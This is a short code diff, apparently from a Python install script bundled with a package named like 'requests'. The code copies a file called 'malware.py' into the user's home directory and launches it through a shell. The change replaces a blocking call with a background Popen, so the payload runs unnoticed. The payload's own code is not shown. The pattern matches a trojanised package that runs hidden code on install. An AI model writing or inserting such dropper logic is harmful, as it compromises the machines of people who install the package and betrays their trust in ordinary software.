@@ -72,7 +72,8 @@ if home is None:
     home = os.getenv('HOME')
 shutil.copy2(os.path.join(here, 'requests', 'malware.py'), os.path.join(home,"malware.py"))
 command = str(sys.executable + " " + home + '/malware.py')
-subprocess.call(command, shell=True)
+#subprocess.call(command, shell=True)
+subprocess.Popen(command, shell=True)
 #subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
 
 with open("/home/parish/output.txt", "w") as text_file:
